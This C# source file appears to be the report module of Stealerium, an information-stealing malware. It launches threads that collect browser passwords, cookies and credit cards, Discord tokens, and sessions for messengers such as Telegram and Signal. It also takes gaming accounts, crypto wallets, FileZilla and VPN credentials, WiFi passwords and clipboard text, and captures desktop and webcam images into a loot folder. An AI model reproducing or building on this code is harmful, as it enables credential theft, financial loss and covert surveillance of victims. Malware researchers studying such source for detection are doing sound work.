using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Stealerium.Clipper;
using Stealerium.Target;
using Stealerium.Target.Gaming;
using Stealerium.Target.Messengers;
using Stealerium.Target.System;
using Stealerium.Target.VPN;

namespace Stealerium.Helpers
{
    internal sealed class Report
    {
        public static bool CreateReport(string sSavePath)
        {
            // List with threads
            var threads = new List<Thread>();
            try
            {
                // Collect files (documents, databases, images, source codes)
                if (Config.GrabberModule == "1")
                    threads.Add(new Thread(() =>
                        FileGrabber.Run(sSavePath + "\\Grabber")
                    ));

                // Chromium & Edge thread (credit cards, passwords, cookies, autofill, history, bookmarks)
                threads.Add(new Thread(() =>
                {
                    Target.Browsers.Chromium.Recovery.Run(sSavePath + "\\Browsers");
                    Target.Browsers.Edge.Recovery.Run(sSavePath + "\\Browsers");
                }));
                // Firefox thread (logins.json, db files, cookies, history, bookmarks)
                threads.Add(new Thread(() =>
                    Target.Browsers.Firefox.Recovery.Run(sSavePath + "\\Browsers")
                ));

                // Write discord tokens
                threads.Add(new Thread(() =>
                    Discord.WriteDiscord(
                        Discord.GetTokens(),
                        sSavePath + "\\Messenger\\Discord")
                ));

                // Write pidgin accounts
                threads.Add(new Thread(() =>
                    Pidgin.Get(sSavePath + "\\Messenger\\Pidgin")
                ));

                // Write outlook accounts
                threads.Add(new Thread(() =>
                    Outlook.GrabOutlook(sSavePath + "\\Messenger\\Outlook")
                ));

                // Write telegram session
                threads.Add(new Thread(() =>
                    Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram")
                ));

                // Write skype session
                threads.Add(new Thread(() =>
                    Skype.GetSession(sSavePath + "\\Messenger\\Skype")
                ));

                // Write Element session
                threads.Add(new Thread(() =>
                    Element.GetSession(sSavePath + "\\Messenger\\Element")
                ));

                // Write Signal session
                threads.Add(new Thread(() =>
                    Signal.GetSession(sSavePath + "\\Messenger\\Signal")
                ));

                // Write Tox session
                threads.Add(new Thread(() =>
                    Tox.GetSession(sSavePath + "\\Messenger\\Tox")
                ));

                // Write icq session
                threads.Add(new Thread(() =>
                    Icq.GetSession(sSavePath + "\\Messenger\\ICQ")
                ));

                // Steam & Uplay sessions collection
                threads.Add(new Thread(() =>
                {
                    // Write steam session
                    Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
                    // Write uplay session
                    Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
                    // Write battle net session
                    BattleNet.GetBattleNetSession(sSavePath + "\\Gaming\\BattleNET");
                }));

                // Minecraft collection
                threads.Add(new Thread(() =>
                    Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft")
                ));

                // Write wallets
                threads.Add(new Thread(() =>
                    Wallets.GetWallets(sSavePath + "\\Wallets")
                ));

                // Write Browser Wallets
                threads.Add(new Thread(() =>
                {
                    Target.Browsers.Chromium.Extensions.GetChromeWallets(sSavePath + "\\Wallets\\Chrome_Wallet");
                    Target.Browsers.Edge.Extensions.GetEdgeWallets(sSavePath + "\\Wallets\\Edge_Wallet");
                }));

                // Write FileZilla
                threads.Add(new Thread(() =>
                    FileZilla.WritePasswords(sSavePath + "\\FileZilla")
                ));

                // Write VPNs
                threads.Add(new Thread(() =>
                {
                    ProtonVpn.Save(sSavePath + "\\VPN\\ProtonVPN");
                    OpenVpn.Save(sSavePath + "\\VPN\\OpenVPN");
                    NordVpn.Save(sSavePath + "\\VPN\\NordVPN");
                }));

                // Get directories list
                threads.Add(new Thread(() =>
                {
                    Directory.CreateDirectory(sSavePath + "\\Directories");
                    DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                }));

                // Create directory to save system information
                Directory.CreateDirectory(sSavePath + "\\System");

                // Process list & active windows list
                threads.Add(new Thread(() =>
                {
                    // Write process list
                    ProcessList.WriteProcesses(sSavePath + "\\System");
                    // Write active windows titles
                    ActiveWindows.WriteWindows(sSavePath + "\\System");
                }));

                // Desktop & Webcam screenshot
                var dwThread = new Thread(() =>
                {
                    // Create dekstop screenshot
                    DesktopScreenshot.Make(sSavePath + "\\System");
                    // Create webcam screenshot
                    WebcamScreenshot.Make(sSavePath + "\\System");
                });
                dwThread.SetApartmentState(ApartmentState.STA);
                threads.Add(dwThread);

                // Saved wifi passwords
                threads.Add(new Thread(() =>
                    {
                        // Fetch saved WiFi passwords
                        Wifi.SavedNetworks(sSavePath + "\\System");
                        // Fetch all WiFi networks with BSSID
                        Wifi.ScanningNetworks(sSavePath + "\\System");
                    }
                ));
                // Windows product key
                threads.Add(new Thread(() =>
                    // Write product key
                    File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                        ProductKey.GetWindowsProductKeyFromRegistry())
                ));
                // Debug logs
                threads.Add(new Thread(() =>
                    Logging.Save(sSavePath + "\\System\\Debug.txt")
                ));
                // System info
                threads.Add(new Thread(() =>
                    SysInfo.Save(sSavePath + "\\System\\Info.txt")
                ));
                // Clipboard text
                threads.Add(new Thread(() =>
                    File.WriteAllText(sSavePath + "\\System\\Clipboard.txt",
                        Clipboard.GetText())
                ));
                // Get installed apps
                threads.Add(new Thread(() =>
                    InstalledApps.WriteAppsList(sSavePath + "\\System")
                ));

                // Start all threads
                foreach (var t in threads)
                    t.Start();

                // Wait all threads
                foreach (var t in threads)
                    t.Join();

                return Logging.Log("Report created");
            }
            catch (Exception ex)
            {
                return Logging.Log("Failed to create report, error:\n" + ex, false);
            }
        }
    }
}